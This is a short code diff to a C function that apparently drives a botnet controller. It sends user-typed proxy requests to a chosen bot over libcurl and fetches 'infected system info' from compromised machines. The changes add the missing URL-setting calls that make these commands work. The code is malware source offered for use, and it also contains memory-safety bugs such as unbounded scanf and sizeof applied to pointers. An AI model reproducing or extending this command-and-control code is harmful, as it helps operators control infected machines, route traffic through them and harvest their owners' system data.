@@ -219,13 +219,13 @@ void sendCommand(char *command, int bot_id)
 
             printf("Insert request to proxy : ");
             scanf("%s", request);
-
             char *new_url = (char *)malloc(sizeof(url) + sizeof(request) + sizeof(HTTP_REQ_ENDPOINT));
             memcpy(new_url, url, sizeof(url));
-
             strcat(new_url, HTTP_REQ_ENDPOINT);
-
             strcat(new_url, request);
+            curl_easy_setopt(curl, CURLOPT_URL, new_url);
+
+
 
             printf("Sending request:  %s to bot...\n", new_url);
             free(new_url);
@@ -241,10 +241,10 @@ void sendCommand(char *command, int bot_id)
         }
         if (strcmp(command, SYS_INFO) == 0)
         {
-            printf("Retrieving infected system info to: ");
+            printf("Retrieving infected system info\n");
 
             strcat(url, "/sys_info");
-
+            curl_easy_setopt(curl, CURLOPT_URL, url);
             curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
         }
 
